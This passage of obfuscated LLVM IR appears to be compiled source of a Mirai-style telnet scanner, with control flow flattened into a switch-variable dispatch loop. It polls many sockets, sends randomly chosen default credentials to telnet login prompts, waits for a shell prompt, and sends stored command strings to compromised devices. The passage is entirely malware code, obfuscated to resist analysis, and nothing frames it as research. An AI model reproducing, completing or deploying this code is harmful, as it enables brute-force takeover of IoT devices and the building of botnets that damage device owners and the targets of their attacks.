  %453 = load i32, i32* %452, align 8
  %454 = icmp ugt i32 %453, 2
  %455 = select i1 %454, i32 1009746591, i32 -507148781
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %458 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %457, i32 0, i32 9
  %459 = load i8, i8* %458, align 4
  %460 = add i8 %459, 1
  store i8 %460, i8* %458, align 4
  %461 = zext i8 %460 to i32
  %462 = icmp eq i32 %461, 10
  %463 = select i1 %462, i32 828946720, i32 -2048510019
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %465, i32 1)
  store i32 236831010, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %467)
  store i32 236831010, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  store i32 -1006448341, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %471 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %470, i32 0, i32 9
  store i8 0, i8* %471, align 4
  %472 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %473 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %472, i32 0, i32 16
  store i32 0, i32* %473, align 8
  store i32 -1006448341, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  store i32 -1198779449, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %477 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %476, i32 0, i32 16
  %478 = load i32, i32* %477, align 8
  %479 = icmp eq i32 %478, 1
  %480 = select i1 %479, i32 1809641631, i32 -491411984
  store i32 %480, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %483 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %482, i32 0, i32 2
  %484 = load i32, i32* %483, align 8
  %485 = srem i32 %484, 64
  %486 = zext i32 %485 to i64
  %487 = shl i64 1, %486
  %488 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %489 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %490 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %489, i32 0, i32 2
  %491 = load i32, i32* %490, align 8
  %492 = sdiv i32 %491, 64
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds [16 x i64], [16 x i64]* %488, i64 0, i64 %493
  %495 = load i64, i64* %494, align 8
  %496 = or i64 %495, %487
  store i64 %496, i64* %494, align 8
  %497 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %498 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %497, i32 0, i32 2
  %499 = load i32, i32* %498, align 8
  %500 = load i32, i32* %15, align 4
  %501 = icmp sgt i32 %499, %500
  %502 = select i1 %501, i32 -1792596803, i32 -1823396757
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %505 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %504, i32 0, i32 2
  %506 = load i32, i32* %505, align 8
  store i32 %506, i32* %15, align 4
  store i32 -1823396757, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 558366606, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %510 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %509, i32 0, i32 16
  %511 = load i32, i32* %510, align 8
  %512 = icmp ne i32 %511, 0
  %513 = select i1 %512, i32 1246145767, i32 1070645362
  store i32 %513, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %516 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %515, i32 0, i32 2
  %517 = load i32, i32* %516, align 8
  %518 = srem i32 %517, 64
  %519 = zext i32 %518 to i64
  %520 = shl i64 1, %519
  %521 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %522 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %523 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %522, i32 0, i32 2
  %524 = load i32, i32* %523, align 8
  %525 = sdiv i32 %524, 64
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds [16 x i64], [16 x i64]* %521, i64 0, i64 %526
  %528 = load i64, i64* %527, align 8
  %529 = or i64 %528, %520
  store i64 %529, i64* %527, align 8
  %530 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %531 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %530, i32 0, i32 2
  %532 = load i32, i32* %531, align 8
  %533 = load i32, i32* %14, align 4
  %534 = icmp sgt i32 %532, %533
  %535 = select i1 %534, i32 949358438, i32 -1114159551
  store i32 %535, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  %537 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %538 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %537, i32 0, i32 2
  %539 = load i32, i32* %538, align 8
  store i32 %539, i32* %14, align 4
  store i32 -1114159551, i32* %switchVar
  br label %loopEnd

; <label>:540:                                    ; preds = %loopEntry
  store i32 1070645362, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  store i32 558366606, i32* %switchVar
  br label %loopEnd

; <label>:542:                                    ; preds = %loopEntry
  store i32 -1198779449, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i32, i32* %1, align 4
  %545 = add nsw i32 %544, 1
  store i32 %545, i32* %1, align 4
  store i32 -1797688084, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  %547 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %547, align 8
  %548 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 1, i64* %548, align 8
  %549 = load i32, i32* %15, align 4
  %550 = load i32, i32* %14, align 4
  %551 = icmp sgt i32 %549, %550
  %552 = select i1 %551, i32 -1108650322, i32 1382763945
  store i32 %552, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  %554 = load i32, i32* %15, align 4
  store i32 -1346588281, i32* %switchVar
  store i32 %554, i32* %.reg2mem52
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  %556 = load i32, i32* %14, align 4
  store i32 -1346588281, i32* %switchVar
  store i32 %556, i32* %.reg2mem52
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %.reload53 = load i32, i32* %.reg2mem52
  %558 = add nsw i32 1, %.reload53
  %559 = call i32 @select(i32 %558, %struct.__sigset_t* %8, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %11)
  %560 = call i64 @time(i64* null) #7
  %561 = trunc i64 %560 to i32
  store i32 %561, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  store i32 -1912425315, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load i32, i32* %1, align 4
  %564 = icmp slt i32 %563, 628
  %565 = select i1 %564, i32 470403865, i32 1866497960
  store i32 %565, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %568 = load i32, i32* %1, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %567, i64 %569
  store %struct.scanner_connection* %570, %struct.scanner_connection** %10, align 8
  %571 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %572 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %571, i32 0, i32 2
  %573 = load i32, i32* %572, align 8
  %574 = icmp eq i32 %573, -1
  %575 = select i1 %574, i32 -710317790, i32 545715892
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  store i32 -1685743335, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %579 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %580 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %579, i32 0, i32 2
  %581 = load i32, i32* %580, align 8
  %582 = sdiv i32 %581, 64
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds [16 x i64], [16 x i64]* %578, i64 0, i64 %583
  %585 = load i64, i64* %584, align 8
  %586 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %587 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %586, i32 0, i32 2
  %588 = load i32, i32* %587, align 8
  %589 = srem i32 %588, 64
  %590 = zext i32 %589 to i64
  %591 = shl i64 1, %590
  %592 = and i64 %585, %591
  %593 = icmp ne i64 %592, 0
  %594 = select i1 %593, i32 -1648070568, i32 805130747
  store i32 %594, i32* %switchVar
  br label %loopEnd

; <label>:595:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 4, i32* %33, align 4
  %596 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %597 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %596, i32 0, i32 2
  %598 = load i32, i32* %597, align 8
  %599 = bitcast i32* %32 to i8*
  %600 = call i32 @getsockopt(i32 %598, i32 1, i32 4, i8* %599, i32* %33) #7
  %601 = load i32, i32* %32, align 4
  %602 = icmp ne i32 %601, 0
  %603 = select i1 %602, i32 1128697648, i32 1194247586
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %606 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %605, i32 0, i32 2
  %607 = load i32, i32* %606, align 8
  %608 = call i32 @close(i32 %607)
  %609 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %610 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %609, i32 0, i32 2
  store i32 -1, i32* %610, align 8
  %611 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %612 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %611, i32 0, i32 9
  store i8 0, i8* %612, align 4
  %613 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %614 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %613, i32 0, i32 16
  store i32 0, i32* %614, align 8
  store i32 -1685743335, i32* %switchVar
  br label %loopEnd

; <label>:615:                                    ; preds = %loopEntry
  %616 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %617 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %616, i32 0, i32 16
  store i32 2, i32* %617, align 8
  %618 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %619 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %618, i32 0, i32 1
  %620 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %619, i32 0, i32 0
  %621 = load i32, i32* %620, align 8
  %622 = icmp ne i32 %621, 0
  %623 = select i1 %622, i32 489529777, i32 -1196199205
  store i32 %623, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  %625 = call %struct.scanner_auth* @random_auth_entry()
  %626 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %627 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %626, i32 0, i32 0
  store %struct.scanner_auth* %625, %struct.scanner_auth** %627, align 8
  store i32 489529777, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  %629 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %630 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %629, i32 0, i32 4
  store i32 0, i32* %630, align 8
  store i32 805130747, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  %632 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %633 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %634 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %633, i32 0, i32 2
  %635 = load i32, i32* %634, align 8
  %636 = sdiv i32 %635, 64
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds [16 x i64], [16 x i64]* %632, i64 0, i64 %637
  %639 = load i64, i64* %638, align 8
  %640 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %641 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %640, i32 0, i32 2
  %642 = load i32, i32* %641, align 8
  %643 = srem i32 %642, 64
  %644 = zext i32 %643 to i64
  %645 = shl i64 1, %644
  %646 = and i64 %639, %645
  %647 = icmp ne i64 %646, 0
  %648 = select i1 %647, i32 749157683, i32 -1780782184
  store i32 %648, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 -1631717358, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %652 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %651, i32 0, i32 16
  %653 = load i32, i32* %652, align 8
  %654 = icmp eq i32 %653, 0
  %655 = select i1 %654, i32 -136003079, i32 1728495011
  store i32 %655, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  store i32 1737722690, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %659 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %658, i32 0, i32 4
  %660 = load i32, i32* %659, align 8
  %661 = icmp sgt i32 %660, 7168
  %662 = select i1 %661, i32 -1813981226, i32 -1071113246
  store i32 %662, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %665 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %664, i32 0, i32 7
  %666 = getelementptr inbounds [8192 x i8], [8192 x i8]* %665, i32 0, i32 0
  %667 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %668 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %667, i32 0, i32 7
  %669 = getelementptr inbounds [8192 x i8], [8192 x i8]* %668, i32 0, i32 0
  %670 = getelementptr inbounds i8, i8* %669, i64 6144
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %666, i8* %670, i64 2048, i32 1, i1 false)
  %671 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %672 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %671, i32 0, i32 4
  %673 = load i32, i32* %672, align 8
  %674 = sub nsw i32 %673, 6144
  store i32 %674, i32* %672, align 8
  store i32 -1071113246, i32* %switchVar
  br label %loopEnd

; <label>:675:                                    ; preds = %loopEntry
  %676 = call i32* @__errno_location() #9
  store i32 0, i32* %676, align 4
  %677 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %678 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %677, i32 0, i32 2
  %679 = load i32, i32* %678, align 8
  %680 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %681 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %680, i32 0, i32 7
  %682 = getelementptr inbounds [8192 x i8], [8192 x i8]* %681, i32 0, i32 0
  %683 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %684 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %683, i32 0, i32 4
  %685 = load i32, i32* %684, align 8
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds i8, i8* %682, i64 %686
  %688 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %689 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %688, i32 0, i32 4
  %690 = load i32, i32* %689, align 8
  %691 = sub nsw i32 8192, %690
  %692 = call i32 @recv_strip_null(i32 %679, i8* %687, i32 %691, i32 16384)
  store i32 %692, i32* %34, align 4
  %693 = load i32, i32* %34, align 4
  %694 = icmp eq i32 %693, 0
  %695 = select i1 %694, i32 246326022, i32 905188777
  store i32 %695, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = call i32* @__errno_location() #9
  store i32 104, i32* %697, align 4
  store i32 -1, i32* %34, align 4
  store i32 905188777, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  %699 = load i32, i32* %34, align 4
  %700 = icmp eq i32 %699, -1
  %701 = select i1 %700, i32 1406315143, i32 1493812928
  store i32 %701, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = call i32* @__errno_location() #9
  %704 = load i32, i32* %703, align 4
  %705 = icmp ne i32 %704, 11
  %706 = select i1 %705, i32 -1412302111, i32 -1703675387
  store i32 %706, i32* %switchVar
  br label %loopEnd

; <label>:707:                                    ; preds = %loopEntry
  %708 = call i32* @__errno_location() #9
  %709 = load i32, i32* %708, align 4
  %710 = icmp ne i32 %709, 11
  %711 = select i1 %710, i32 -780851537, i32 -1703675387
  store i32 %711, i32* %switchVar
  br label %loopEnd

; <label>:712:                                    ; preds = %loopEntry
  %713 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %714 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %713, i32 0, i32 2
  %715 = load i32, i32* %714, align 8
  %716 = call i32 @close(i32 %715)
  %717 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %718 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %717, i32 0, i32 2
  store i32 -1, i32* %718, align 8
  %719 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %720 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %719, i32 0, i32 9
  %721 = load i8, i8* %720, align 4
  %722 = add i8 %721, 1
  store i8 %722, i8* %720, align 4
  %723 = zext i8 %722 to i32
  %724 = icmp sge i32 %723, 10
  %725 = select i1 %724, i32 -390267454, i32 -1482779460
  store i32 %725, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  %727 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %727, i32 1)
  store i32 444706510, i32* %switchVar
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  %729 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %729)
  store i32 444706510, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  store i32 -1703675387, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  store i32 1737722690, i32* %switchVar
  br label %loopEnd

; <label>:732:                                    ; preds = %loopEntry
  %733 = load i32, i32* %34, align 4
  %734 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %735 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %734, i32 0, i32 4
  %736 = load i32, i32* %735, align 8
  %737 = add nsw i32 %736, %733
  store i32 %737, i32* %735, align 8
  %738 = load i32, i32* @fake_time, align 4
  %739 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %740 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %739, i32 0, i32 3
  store i32 %738, i32* %740, align 4
  store i32 729831660, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  %742 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %743 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %742, i32 0, i32 16
  %744 = load i32, i32* %743, align 8
  store i32 %744, i32* %.reg2mem33
  store i32 -1596593025, i32* %switchVar
  br label %loopEnd

NodeBlock21:                                      ; preds = %loopEntry
  %.reload46 = load volatile i32, i32* %.reg2mem33
  %Pivot22 = icmp slt i32 %.reload46, 8
  %745 = select i1 %Pivot22, i32 -1425978692, i32 -707119292
  store i32 %745, i32* %switchVar
  br label %loopEnd

NodeBlock19:                                      ; preds = %loopEntry
  %.reload39 = load volatile i32, i32* %.reg2mem33
  %Pivot20 = icmp slt i32 %.reload39, 11
  %746 = select i1 %Pivot20, i32 463161322, i32 1367743113
  store i32 %746, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload36 = load volatile i32, i32* %.reg2mem33
  %Pivot18 = icmp slt i32 %.reload36, 12
  %747 = select i1 %Pivot18, i32 1311921355, i32 290743253
  store i32 %747, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload35 = load volatile i32, i32* %.reg2mem33
  %Pivot16 = icmp slt i32 %.reload35, 13
  %748 = select i1 %Pivot16, i32 -1103187990, i32 2112063130
  store i32 %748, i32* %switchVar
  br label %loopEnd

LeafBlock13:                                      ; preds = %loopEntry
  %.reload34 = load volatile i32, i32* %.reg2mem33
  %SwitchLeaf14 = icmp eq i32 %.reload34, 13
  %749 = select i1 %SwitchLeaf14, i32 -1639806888, i32 -959593676
  store i32 %749, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload38 = load volatile i32, i32* %.reg2mem33
  %Pivot12 = icmp slt i32 %.reload38, 9
  %750 = select i1 %Pivot12, i32 1555202698, i32 873727228
  store i32 %750, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload37 = load volatile i32, i32* %.reg2mem33
  %Pivot10 = icmp slt i32 %.reload37, 10
  %751 = select i1 %Pivot10, i32 1527309888, i32 -1027734138
  store i32 %751, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload45 = load volatile i32, i32* %.reg2mem33
  %Pivot8 = icmp slt i32 %.reload45, 5
  %752 = select i1 %Pivot8, i32 1092906356, i32 -346783058
  store i32 %752, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload41 = load volatile i32, i32* %.reg2mem33
  %Pivot6 = icmp slt i32 %.reload41, 6
  %753 = select i1 %Pivot6, i32 300554331, i32 -288588698
  store i32 %753, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload40 = load volatile i32, i32* %.reg2mem33
  %Pivot4 = icmp slt i32 %.reload40, 7
  %754 = select i1 %Pivot4, i32 1091485866, i32 -245041345
  store i32 %754, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload44 = load volatile i32, i32* %.reg2mem33
  %Pivot2 = icmp slt i32 %.reload44, 3
  %755 = select i1 %Pivot2, i32 -614661589, i32 1757852561
  store i32 %755, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload42 = load volatile i32, i32* %.reg2mem33
  %Pivot = icmp slt i32 %.reload42, 4
  %756 = select i1 %Pivot, i32 -1559813725, i32 -972559451
  store i32 %756, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload43 = load volatile i32, i32* %.reg2mem33
  %SwitchLeaf = icmp eq i32 %.reload43, 2
  %757 = select i1 %SwitchLeaf, i32 219492604, i32 -959593676
  store i32 %757, i32* %switchVar
  br label %loopEnd

; <label>:758:                                    ; preds = %loopEntry
  %759 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %760 = call i32 @consume_iacs(%struct.scanner_connection* %759)
  store i32 %760, i32* %35, align 4
  %761 = icmp sgt i32 %760, 0
  %762 = select i1 %761, i32 -1225901765, i32 2098546661
  store i32 %762, i32* %switchVar
  br label %loopEnd

; <label>:763:                                    ; preds = %loopEntry
  %764 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %765 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %764, i32 0, i32 16
  store i32 3, i32* %765, align 8
  store i32 2098546661, i32* %switchVar
  br label %loopEnd

; <label>:766:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:767:                                    ; preds = %loopEntry
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %769 = call i32 @consume_login_prompt(%struct.scanner_connection* %768, i32 1)
  store i32 %769, i32* %35, align 4
  %770 = icmp sgt i32 %769, 0
  %771 = select i1 %770, i32 561033181, i32 -2146421232
  store i32 %771, i32* %switchVar
  br label %loopEnd

; <label>:772:                                    ; preds = %loopEntry
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 2
  %775 = load i32, i32* %774, align 8
  %776 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %777 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %776, i32 0, i32 0
  %778 = load %struct.scanner_auth*, %struct.scanner_auth** %777, align 8
  %779 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %778, i32 0, i32 0
  %780 = load i8*, i8** %779, align 8
  %781 = call i32 (i32, i8*, ...) @fdsend(i32 %775, i8* %780)
  %782 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %783 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %782, i32 0, i32 16
  store i32 4, i32* %783, align 8
  store i32 -2146421232, i32* %switchVar
  br label %loopEnd

; <label>:784:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:785:                                    ; preds = %loopEntry
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %787 = call i32 @consume_login_prompt(%struct.scanner_connection* %786, i32 0)
  store i32 %787, i32* %35, align 4
  %788 = icmp sgt i32 %787, 0
  %789 = select i1 %788, i32 1168943551, i32 816183067
  store i32 %789, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %792 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %791, i32 0, i32 2
  %793 = load i32, i32* %792, align 8
  %794 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %795 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %794, i32 0, i32 0
  %796 = load %struct.scanner_auth*, %struct.scanner_auth** %795, align 8
  %797 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %796, i32 0, i32 1
  %798 = load i8*, i8** %797, align 8
  %799 = call i32 (i32, i8*, ...) @fdsend(i32 %793, i8* %798)
  %800 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %801 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %800, i32 0, i32 16
  store i32 5, i32* %801, align 8
  store i32 816183067, i32* %switchVar
  br label %loopEnd

; <label>:802:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:803:                                    ; preds = %loopEntry
  %804 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %805 = call i32 @consume_shell_prompt(%struct.scanner_connection* %804)
  store i32 %805, i32* %35, align 4
  %806 = icmp sgt i32 %805, 0
  %807 = select i1 %806, i32 506666389, i32 -1461868110
  store i32 %807, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %809 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %810 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %809, i32 0, i32 2
  %811 = load i32, i32* %810, align 8
  %812 = call i32 (i32, i8*, ...) @fdsend(i32 %811, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i32 0, i32 0))
  %813 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %814 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %813, i32 0, i32 2
  %815 = load i32, i32* %814, align 8
  %816 = call i8* @table_retrieve_val(i32 11, i32* null)
  %817 = call i32 (i32, i8*, ...) @fdsend(i32 %815, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0), i8* %816)
  call void @table_lock_val(i8 zeroext 11)
  %818 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %819 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %818, i32 0, i32 16
  store i32 6, i32* %819, align 8
  store i32 1128262868, i32* %switchVar
  br label %loopEnd

